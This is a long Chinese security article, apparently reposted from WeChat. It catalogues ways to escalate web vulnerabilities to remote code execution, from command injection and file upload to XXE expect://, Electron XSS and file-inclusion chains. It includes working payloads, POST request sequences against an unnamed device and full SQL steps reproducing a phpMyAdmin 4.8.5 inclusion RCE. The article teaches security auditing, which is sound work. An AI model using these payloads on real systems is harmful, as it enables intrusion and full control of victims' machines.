> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/p7aOrpvustNYslCYGz5_iw)

这篇文章是 ZAC 安全的点点师傅写的，之前发星球的时候我觉得写的非常不错，非常适合各类新老审计员进行学习。如果说之前我写的《[年轻人如何挖掘第一个 RCE](http://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&mid=2456098705&idx=1&sn=2e05e15cffd98dd0266ddeb684bd477a&chksm=803c6658b74bef4ec2de5eec74ffa981521e78f8acfe2323625f04c10da7ae6b607b794ff47b&scene=21#wechat_redirect)》这篇文章是 RCE 的心法，那么现在这篇文章则是更具体的术的集合，两篇文章对照着看相信很快 RCE 就像喝水一样简单了。

**警告⚠️：该文章包含 28000 多字 221 张图，预计阅读时间为 72 分钟，内容过于冗长，建议收藏后慢慢阅读**  

![](https://mmbiz.qpic.cn/mmbiz_jpg/SHI5wib3tvANbZK0EL9zobHJx6DrP5BUnL5Adgj19sQo2QWtnHicuGmFATaf59elJPUwAJehE8woZZxXI4SxmAEg/640?wx_fmt=jpeg)

目录

0. 前言与基础概念

1.exec 无过滤拼接 RCE    易

2. 任意文件写入 RCE    易

3. 文件上传 RCE     中

4. 任意登录后台 + 后台 RCE    易

5.SQL 语句执行 + 写入权限 + 绝对路径 RCE    易

6.XSS+electron RCE    易

7.XXE+php 协议 RCE     易

8.SSRF + 远程文件下载 RCE    中

9. 文件包含 RCE    中上

10. 反序列化 RCE    难

11. 表达式注入 RCE    中上

12.JNDI 注入 RCE    中上

13.JDBC + 反序列化 RCE    中上

14.SSTI 注入 RCE    易

15. 缓冲区溢出 RCE    难

16.php 环境变量注入 RCE    难

17.POC/EXP 编写    易

18.Bypass 笔记    易

0

**00**

前言与基础概念  

        RCE 全称 remote command/code execute  
        远程代码执行和远程命令执行，那么 RCE 的作用呢？就相当于我可以在你的电脑中执行任意命令，那么就可以进而使用 MSF/CS 上线你的主机，就可以完全控制你的电脑了，所以做渗透中，个人认为危害最大的就是 RCE，你 SQL 注入，我有 RCE 直接连接数据库，你有未授权 / 信息泄露，我直接查看这些信息，你有 XSS，我直接改源码，你有弱口令，我直接扒下来电脑里存储的密码，大多数漏洞能做到的，RCE 都可以轻而易举的做到，所以我在做挖洞或代审的时候也更会偏向 RCE 的挖掘，而我在网上发现 RCE 的利用方式有很多，并且像是 XSS 到 RCE，XXE 到 RCE 这种小众的利用手段有很多人都不知道，于是就有了此文，也算是自己的一个简单笔记总结文章吧，这篇文章写的我个人认为很全面了几乎涵盖大部分的 RCE 利用手段了，肯定还有很小众的 RCE 我没发现，不过全面的坏处就是不够深，都是比较浅的东西，想深入的还是多搜点其他大佬的文章吧  
        基础的 shell 符号概念  
cmd1 | cmd2 只执行 cmd2  
cmd1 || cmd2 只有当 cmd1 执行失败后，cmd2 才被执行  
cmd1 & cmd2 先执行 cmd1，不管是否成功，都会执行 cmd2  
cmd1 && cmd2 先执行 cmd1，cmd1 执行成功后才执行 cmd2，否则不执行 cmd2  
Linux 还支持分号（;），cmd1;cmd2 按顺序依次执行，先执行 cmd1 再执行 cmd2  
php 中也可以用反引号 echo `whoami`;

1  
  

**01**

exec 无过滤拼接 RCE

        首先是黑盒，平常我们看到了敏感的参数，比如 ping 啊，traceroute 等测试连通性的，百分之 80 都基本都有命令拼接（但不一定有 RCE），我们以某网关当例子  
看到了 ping 和 traceroute，输入 127.0.0.1 和 1

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14KJYRticSptSjkqLjy7TGZ2mO3ZCm7GicQIWXxdLYYrDONE9mPSgWavXw/640?wx_fmt=png)

        然后抓包，第一个包，记住这个 sessionid，要在第二个包的 post 中添加过去

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14nZQlc2N2eyx3mPcUIKVS59pD0ZtOicNt9fVDjqtSibU7328hpexicsVsQ/640?wx_fmt=jpeg)

        第二个包，我们发现参数过滤了

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14aaAXPLAG1a5QqPicg5eKZOlgl30XX5Oib8TA06pn2ZfLLicljfibL9hRvw/640?wx_fmt=jpeg)

        没有关系，用 traceroute 试试

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14l0IaDKWgEwZqxNk67x9libaMnj7icB1mTRsEwOeHwia98DPPib45FAEdIg/640?wx_fmt=jpeg)

        可以看到，拼接数据包的时候并没有过滤，这样我们就拿下 rce 了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14iceM8UsEhUtasBnf9hKRFbuUoZsia6Phra2V3iafbo59TFe6zdZrLAibaQ/640?wx_fmt=png)

        那要是有源代码的话我们该如何审计呢，这里以某管理平台做例子，call_function 参数直接 post 进来，然后 switch 判断是 ping 还是 tracert，两边都一样，cmd 直接拼接了 post 的参数，然后 exec 直接输出

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14ia5P95D5kIp4NqonQYpBNwy7iavcnmbubmgxjzyWzw51iaia3onCpiayVibQ/640?wx_fmt=jpeg)

        那么直接构造参数就可以造成 rce

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14HoBqic0xqZcv3K2YYbWh8CwDzXPzekzbY6IVP5yInZlgz8CAP252yag/640?wx_fmt=jpeg)

        我们除了 exec，还可以全局搜索 system，shell_exec 等命令函数，原理一样不在赘述，以下为某防火墙的小通杀

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14naK52GKnibKmAeicODsahA2icffjhFOgnoyE2rwrq1efliaM0QSXh9uyJg/640?wx_fmt=jpeg)

2  

**02**

任意文件写入

        当然，这些只是单纯的执行命令，在 php 中还有 file_put_contents 这种可以写入的函数，例子如下，这是之前 bc 站的源码，应该是一个小后门, google88990 接受传参，然后 file_put_contents 直接拼接进去，写入文件

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ143JsWiaTnYf6mib4frvicpny94MemdpWz4xaHHK2xCreDfFhzJa26qtPvw/640?wx_fmt=jpeg)

        直接构造 payload

```
xxx/xxx/xxx/xx/xxx/GoogleChartMapMarker.php?google88990=phpinfo();
```

        就可以直接 getshell 了

3  
  

**03**

文件上传

        大家用的最最常见的 rce 方法应该就是文件上传了，这里拿我之前写过的一篇作为案例

这里下载源代码 RiteCMS - download

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14f6XWMNXom45DOmjtnaF3Usm0NgAgcX2LibTNkdUw77I8ibFufNQQPbWA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14tP6otTyS13UlHq3qx1p0VLrMlTbCBGuXhyNvzO2eGOiavg2UtbdQpUQ/640?wx_fmt=jpeg)

        访问 admin.php ， 然后输入默认账密 admin admin ， 再次访问 admin.php 进入后台

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14vQTlHIXhc2WfLmNR5RmB4Sb5wZ0GBxOSvHbeHoNP9WdaGWFtUmSlMg/640?wx_fmt=jpeg)

File Manager

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14Yiaykkd0Q66icyE0RS7Qx6UAIa4UxrOn3C7S5KDJFlrww4s3FQYiaK99w/640?wx_fmt=jpeg)

Upload file

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ148MUmYOeIaicLdsdCSuXjPjsAhvPq02ggKLL2fyXDJAIc1GtroZyzL0w/640?wx_fmt=jpeg)

选择文件

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14eOOC7hxdAiaNDcyQYkrAANlOBKW7BHEoTFUoiavAeDacqoFKzUkRkQAQ/640?wx_fmt=jpeg)

OK-Upload file

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14jiavBNciaPV38wlOgEZjJePTGEXRic0SRXrYDuicocibVhmic4ZeCbPzlxQA/640?wx_fmt=jpeg)

Admin.php 中，进入到 filemanage.inc.php 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14AStCqqMPz9TyaNdtR3KCT7XVuC4lF5nRxoZ7G8AIyZhYIZChoFjmeQ/640?wx_fmt=jpeg)

进入之后看到 fileupload 函数，这里 new 一个类，把对象赋值到 upload， 然后全局搜索

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14bDMREibwyPibolPoA2192O4zyIQ4j6RwLEibjiafPggKmK5DlQiadx1uxqw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14mhVTxkXT29Yc3t9x8kZWic1jJ6k62aeJ5q2kOykWeRtUKBXlyFXNlkQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14CtEIxzsGe9oGqXlo6EiaJjNp1rNlucibwv33lSnoCLcHFkjRRK8zjcSw/640?wx_fmt=jpeg)

这里赋值了 upload 和 uploaddir 参数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14OWm8ZGWswb8d3cdDpUHpuud4oS8Ig5I4GU3pVkGT2YKKHBb1lsu7ng/640?wx_fmt=png)

        继续往下走

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14GItbib9jKwCTJSIgpfhv8KYsqV6szCfzNHBUnglUjjTUMMHSVuOcVcg/640?wx_fmt=jpeg)

        在 73 行 有 move_uploaded_file 函 数 进 行 上 传 ， 前 面 的  

$this->upload[‘tmp_name’] 是之前上传的文件临时文件夹的后缀名， 后面的 $this->uploadDir.$tempFileName 是 BASE_PATH.$directory.’/’  
        然后回到刚刚的 filemanager.inc.php 文件  

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14icu6Se35ThmFX9rq8eL7lZz7CjwmjZC6JCfmgUNkiaaXA9VIKK6fFAtA/640?wx_fmt=jpeg)

        看到 base_path，我们再去全局搜索一下

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ141iamldtx9EfQmdsibqpFHdZblzmHHhe8sUQAanZx3ko4YWY5bv1nDEGg/640?wx_fmt=jpeg)

        在 settings.php 文件中可以到，返回了绝对路径的上一级目录然后跟踪 directory 参数![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14nL4zPvg1mY2uNHoCzG7NCQ3eNOwicibryic5oFBkYMCvw34gPADUfiaO5Q/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14NfVFicVj0hicbibcREYWiarB0CRNtCibRxcyCu1ra1xiaJ2bFljwtEW8KWSw/640?wx_fmt=jpeg)

        这里的目录是不固定的，如果判断为 true，则是 / files，如果为 false， 则 是 /media

        然后继续往下走

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14DCc4omG9XrJwZyPX9VahhrgF0PEXZfgphiasXXVDeicqsBHlC6Z6KMtw/640?wx_fmt=jpeg)

        如果为 false 进入 else 语句，调用 savefile 函数  

        这里的 filename 和 file_name 是一样的

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14Whkg7qHKyiaW6QGy3feyrWz0EwZVQkcPxibiaKvaRP6Owhic7ePxFicFEuA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14Xs1ENZnRjludzJLWx1E4Bb8FxLg2tHLrAF4jF5WjAvg8YQLHPZ3pZA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14IJiaf9GF3nwdUDxXqz4ZeksNyD1eMQqdYe2Tle12fv93Vr2ibRMuRXVg/640?wx_fmt=jpeg)

        该函数直接用 copy 函数将临时文件复制到后面的文件中，成功拿下 rce

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14hicRqicYoql2veCyH9NpOOA6IYaqvhHWdgoTvickSJxuibFQUUo0dpLs4g/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lBJFhJjp8BZgBqicf28PHZ14XQMtd1VBWQxDtDt8MwO7ka23CBULUyDPKRCxBBRqhicq7ozSU2yqXqQ/640?wx_fmt=jpeg)

这是 copy 函数中的参数来源

4  

**04**

任意登录后台 + 后台 RCE

        当然，有的时候可能会进行鉴权，比如只有在后台的时候才可以使用 xx 方法，xx 功能，那么我们要配合信息泄露或者未授权进行组合 combo，如下

        我们可以看到，在 shell_exec 前会判断是否登录了

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1VAlTiboEy48kKEzU8fgyDpscXQaPFibFPo3AFRQnYZVMsB75GBH6b09A/640?wx_fmt=jpeg)

‍        那么我们只要有方法不需要实际的账号密码可以进入后台，那么就是个前台 rce，如下，只需要密码为 hassmedia 就可以成功的进入后台

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1usToo9evbaS0QFebZC6XneB7TG5uTRE3lAnI9pEWfJ1KL9RVegurjQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1usFiaonu3RdW7Y3t2ib0iaP7fcicicmqRmeCTu3ubJtiaUXyhOX92erAO9YQ/640?wx_fmt=png)

5  
  

**05**

SQL 语句执行 + 写入权限 + 绝对路径

        还有一种常见的拿 shell 手段是利用 sql 语句，如下

        某次渗透过程中扫描到了一个 3.txt 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1lVDYZ9D5Blr4rtxCCycjT8h1QXxqoAgGceLu1wKVHzAz2aq21FS3UQ/640?wx_fmt=png)

        可以看到有了绝对路径，那么我们现在就是需要找到 sql 注入点或者能执行 sql 的方法，访问 phpmyadmin 的时候直接进去了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG16Re7BCmNS05mqhXt3W1qmgWTZkk6QxvIc880ZCdKgpQt5mbPgL2kSg/640?wx_fmt=png)

        权限有了，执行点有了，绝对路径也有了，接下来就是常规的写 shell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1VvzKluwW3HO8TXJlsTV8cF0ofgFmntj0eiar1QhXZntkgV5rEqc3cQQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1UEj0vu4Z0utypQzehosBQGVHomRtGmOZwMobnqf4nb1ySK66ZJoxOQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1HfI9o3ocHG2WyBaQDYrccEz3cpFtb8jx6GicbQvKvkzjvYUibU0mt32g/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1F636iar9b7biap78NsOHlvzdyiaxjib89mweBiag0HicShvrg2r05c3gUmgw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG14x8iccZvYtib8RESC9SsDudy2gg0WicfKFxjBocH6xqPM6lAsmKa4Pv1A/640?wx_fmt=jpeg)

        原理就不赘述了，把两个重要语句贴下面了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1GOPaDa0LHbMMHvcLnI4Nfz0FWAEbahoUFqTp0RmyD1D2aQz9CHcRuA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1xicGXO3vhWaEpgbZqBvYhusEOkhDTicCNxasHdAXvbSeKNIGP5d3p9Ag/640?wx_fmt=png)

        当然，如果是 sqlserver 可以直接用 xp_cmdshell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1icsMsHoJpjf8hKHxXgcCaWoJvvPxrzwXRV6z6Bq211KkDa2rWrM8icog/640?wx_fmt=png)

6  
  

**06**

XSS+electron

        Sql 到 rce 都有了，那么为何不试试 xss 到 rce 呢？先安装好 node.js 和 electron

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1IUQhfwRF5RYy8pTbzTLCE5cXkJGicerzibsJA7LOPogia2tuaCdicBmI3g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1WdzQEmCt5HoyztxyuK1ibibrXklgFR1o3rCbqCF92EYmnAwexVMEl7zg/640?wx_fmt=jpeg)

使用 npm 下载的话会比较慢，这里可以用另一种方法

```
npm install -g cnpm --registry=https://registry.npm.taobao.org
cnpm install electron -g
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1Qx0h3bFdEERDC6Z5U2H8jhbicPLuvCCbbl8keN3FqtdabaLMmb8A2jg/640?wx_fmt=png)

        成功安装，然后开始搭建环境

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1ibIQos2jib7uoPhAwkGyRcicsdTkSlnPoJx9e0P0141GXiaN3euMAc5CqA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1go29A1ZtWqXzbYcpdmf5fpAkyFDwcd6t4EVxNWh2tQY9KD1jwwZEaw/640?wx_fmt=png)

        三个文件搭建好，然后 npm run start 就可以了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1GBoBIPColh3hMISwer6H07m3T1SuXIeFw3FQzQEO9QxuoRwFr9Q60A/640?wx_fmt=png)

        那么如何利用这个去 rce 呢，简单的一句话，在 index.js 中如下

```
const exec = require('child_process').exec
exec('calc.exe',(err, stdout, stderr) => console.log(stdout))
```

        下图可以看到成功弹出计算器，造成 rce，那么我们在能 xss 的情况下，控制前端代码，并且是 electron 框架的时候，即可造成 rce

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1QLBTziapjCzPDgic5bic0zia3xD6UTKL8ic1Z3oDsQJhR6UW5gRH9EyJj8A/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1e1kjHvedbbY0hsABBfaIWYmcdLSZzUPYzoBnpwkFsrGvTLAMgibqUBg/640?wx_fmt=png)

        大家所熟知的 xss 到 rce 应该就是某剑了，不过因为已经有很多大哥都写过文章了，这里就不在赘述了，感兴趣的可以去查一查，除了某剑还有某 by 也曾爆出过 rce

https://evoa.me/archives/3/#%E8%9A%81%E5%89%91%E5%AE%A2%E6%88%B7%E7%AB%AFRCE%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B%E5%8F%8AElectron%E5%AE%89%E5%85%A8

        如果使用 shell.openExternal 那段，命令里面只能使用 file 打开，或者打开网站，可利用性太小

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1rdEzgnSJNXoe7jqjgvibbaib2rGcWNwVsDzvCTuUIqQpKGROtp9DsOxQ/640?wx_fmt=jpeg)

        打开个计算器还是没啥问题的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1SrVFGy1TPV9jYKUGPqwd0JQZ8DQMerxPVkMj7Un15pCzIm0kQdPjGw/640?wx_fmt=png)

        顺便说一下，网上很多都是用 child_process，然后 export function，但是我实测后发现并不能复现不了，各位师傅可以去看看，最简化版应该就是以下这两行了

```
const exec = require('child_process').exec
exec('calc.exe')
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1p4MdUYVsfhHjpo4ZltKVGNXhn5qNr0AibFGeNNUeElRxUUicKG57KmYw/640?wx_fmt=png)

7  
  

**07**

XXE+php 协议

        除了 xss 还有一种就是 xxe 到 rce，这里为了方便就不在本地搭环境了，随便网上找了个靶场去打，可以看到数据是由 xml 进行传输的，那么我们只要注入恶意 payload 即可造成 xxe 攻击

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1U64Oq895K2uhf0I5ydicEK5AnoQn8f2xnrUe7sOHW1PicXXGJNvgnxqQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG18GC50k43Fqe9gPaO6aZLQIODiaDmibqeFkyABcd37FRQJsZ67RcVu7wg/640?wx_fmt=jpeg)

        但这种情况下，只能造成任意文件读取，xxe 跟 xss 一样，都需要特定的环境才可以造成 rce，比如说配合 php 的协议，expect 等

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG13KueAMsuMHMBZ0qgGILOXn5qONZ6DwPgAZdmXZHfUuQSntPlHBSdDg/640?wx_fmt=png)

        那么我们的语句就可以变成

```
<!ENTITY xxe SYSTEM "expect://id" >]>
```

        也就造成了 rce（懒得配环境了，感兴趣的可自行测试）

8  
  

**08**

SSRF + 远程文件下载

        还有一种 rce 的方式，是利用 ssrf 配合远程文件下载造成的 rce，如下，搭建好网站

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG10IHmf7Dx2n1nJ4hzibiaQXHk4m1zydqnoPe157Jr5qoAtdL1H2qicGLOw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1YdzgSdF4y4JfhKkO3RtwUYQDPlHQqe7ZzjXicoyxTw6eibx5GI7ZxwwA/640?wx_fmt=png)

        分析代码，我们可以看到函数 downloadImage 中，有个 readfile，此处无过滤，这里就是一个简单的 ssrf，但是在 769 行还有一个 imageStream

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1AJRicicbsoeUlQOntF4rmkTOQATqRHd2G1kAy4ks2yJh1ADjicpOpH2HQ/640?wx_fmt=jpeg)

        我们跟进来发现其中有个 file_put_contents，可以直接造成远程文件下载后写入  

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1gicLaKV9mc1Fb6AErdl3ZKxUkLkiaP9qibmiaS9cB8wQLRBWquFhZo38XA/640?wx_fmt=jpeg)

        有了逻辑我们就可以简单的构造数据包如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG14e8WiakSLaoxJUlJ6BfOBSSnEjzxjnOk6OQIgBmbbp3lHFaxicuTQ84Q/640?wx_fmt=jpeg)

        成功写入  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1GoibZSicicSnib5ZY9WeEv4b4yhaicgsJMZibcIvNYCavpAPLNAM312O7BZw/640?wx_fmt=png)

9  
  

**09**

文件包含

      （组合拳 0day 分析与 phpmyadmin 分析）

        我们再换一种思路，尝试利用文件包含组合拳 getshell，以下用某设备的 0day 做示例

全局搜索 include，发现一处可控的文件包含，这是直接 post 进来的

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG12pztrnTn1GleTVGgjYPTKZBzY9VV40j9Culh6Zzbo52ibYkZkrafDsA/640?wx_fmt=jpeg)

        然后再次全局搜索 file_put_contents，看看哪里可以写入，在 set_authAction 中找到了如下利用点，userName 可控，fileCntent 可控，filename 直接拼接 userName

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1dsg43UCPGKyRfpKAB4JwhgczCuIF5lk1F3FcxkSIicBqdgLc81aytWQ/640?wx_fmt=jpeg)

        那么 AUTH_DIR 和 DS 呢？这两个参数在最开始的时候已经定义了，DS 为分隔符，然后 AUTH_DIR 拼接

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1KKR4LNsuM2NA22MJEK6lXPicKAEYtNBIZLMMOMZ41W3FUjT2tMsPBkw/640?wx_fmt=jpeg)

        但文件包含仅限于 / tmp/app_auth/cfile/，我们需要找到一个能创建目录的利用点，全局搜索 mkdir，发现 dir 可控，shell 直接创建了，那么整个漏洞逻辑就出来了

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1iakXEE27zekOWicXyBDITeFZv20a0dnaMGumRAibef0A0icfwmrmR3icmdQ/640?wx_fmt=jpeg)

        先逐级创建目录

```
Post创建目录 store=/tmp/app_auth&isdisk=1
Post创建目录  store=/tmp/app_auth/cfile&isdisk=1
post写入文件数据 serName=../../tmp/app_auth/cfile/sb&auth=<?php phpinfo(); ?>
Post数据包含 cf=sb.txt
```

        成功 getshell

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1MibCQBdXhdwLZAiaeOGj5qGdQKyJlNRIwb4NAViaehLzqdc4OLjt9fyzg/640?wx_fmt=jpeg)

        以上是文件包含 + txt 文件任意写入 + 目录创建的组合拳

        还有一个是最近爆出来的 0day，phpmyadmin 文件包含后台 RCE，不过现在应该打了补丁，但是分析文章还没出来，算是 1day 吧

        复现步骤

1.

```
CREATE DATABASE test; CREATE TABLE test.bar ( baz VARCHAR(100) PRIMARY KEY ); INSERT INTO test.bar SELECT '<?php phpinfo(); ?>';
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1g8tOcfL5icF4Wb0VWfgQhdJTGc8K0duLCNibnSMJ4zLUbD1e4jcMia3KA/640?wx_fmt=jpeg)

2. 然后点 test 库，再执行 sql

```
CREATE TABLE pma__userconfig ( id int(11) NOT NULL, id2 int(11) NOT NULL, config_data text NOT NULL, timevalue date NOT NULL, username char(50) NOT NULL ) ENGINE=MyISAM DEFAULT CHARSET=latin1;
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1Bge31Ificq1ONy2QQwlOAATmojxYshYX6435k7tLE1O1t7KuNHy3A9w/640?wx_fmt=jpeg)

3.

```
INSERT INTO pma__userconfig (id, id2, config_data, timevalue, username) VALUES (1, 2,'{\"DefaultTabDatabase\":\"..\/..\/Extensions\/tmp\/tmp\/sess_inhi60cjt8rojfmjl71jjo6npl\",\"lang\":\"zh_CN\",\"Console\/Mode\":\"collapse\"}','2022-05-07', 'root');
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1alaDNVVtonGVWITDKT4febeqgrAH6jx53efL2lThm1vDtHlib11eGRQ/640?wx_fmt=jpeg)

        删除 cookie

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1o7rOxibQuCdCRJlWEkByY7Ol4Saibq1uZicyoIIUHmZ6uH2ZqumibDBgEg/640?wx_fmt=jpeg)

        访问主页登录进去

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lAfkSOsflia9McoFp6azDJG1sTaQJ3W2VJH59q4og2PcDema6Ye7FBAPOJoNu1ExX4jtK0wwQzKF6g/640?wx_fmt=png)

        登录进来之后访问两次  

http://localhost/phpmyadmin4.8.5/index.php?db=test

        成功 RCE

